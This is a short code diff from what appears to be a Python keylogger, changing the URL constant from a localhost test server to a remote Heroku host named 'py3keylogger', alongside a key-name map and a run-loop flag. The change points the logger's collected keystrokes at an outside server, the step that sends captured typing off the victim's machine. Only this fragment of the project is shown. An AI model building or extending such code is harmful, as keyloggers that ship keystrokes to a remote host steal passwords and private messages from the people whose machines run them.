@@ -19,7 +19,7 @@ CHARMAP = {
     "ctrl": " ctrl-",
     "tab": ""
     }
-URL = "http://127.0.0.1:5000"#"http://py3keylogger.herokuapp.com"
+URL = "http://py3keylogger.herokuapp.com" # "http://127.0.0.1:5000"#
 START_TIME = time.time()
 CONDITION = True
 
